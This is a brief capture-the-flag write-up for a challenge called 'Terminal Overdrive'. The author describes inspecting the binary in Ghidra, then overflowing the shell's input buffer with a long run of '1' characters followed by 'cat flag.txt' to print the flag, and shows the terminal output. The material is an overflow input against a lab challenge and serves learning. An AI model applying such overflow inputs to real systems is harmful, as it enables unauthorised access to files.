# Terminal Overdrive
## Challenge
## Solution
Using ghidra to check file chal, easily to see that I can use 'pwd', 'ls', 'cat' from function evaluate\_statement, so I try overflow by '11111111111111111111111111111111 cat flag.txt' and get the flag
(I just have got some lucky from this chall)
```bash
PACKShell v0.0.0.1.2.5l6.3
$ 111111111111111111111111111111111111111111111 cat flag.txt
flag.txt
flag{cH3ck_uR_bUFF3rz!1!}
```
